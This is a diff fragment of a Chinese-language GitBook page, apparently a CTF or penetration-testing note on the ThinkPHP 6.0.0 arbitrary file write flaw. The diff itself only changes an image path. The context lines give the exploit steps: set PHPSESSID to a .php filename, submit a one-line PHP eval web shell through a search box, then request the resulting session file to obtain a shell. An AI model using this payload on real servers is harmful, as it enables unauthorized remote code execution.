@@ -33,4 +33,4 @@ ThinkPHP V6.0.0有个任意文件写的漏洞，可以直接写shell。
 
 那就修改PHPSESSID为`aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`，然后在搜索框写shell`<?php @eval($_POST['a']);?>`，最后访问`runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`进行getshell
 
-![](<../../.gitbook/assets/image (4).png>)
+![](<../../.gitbook/assets/image (4) (1).png>)
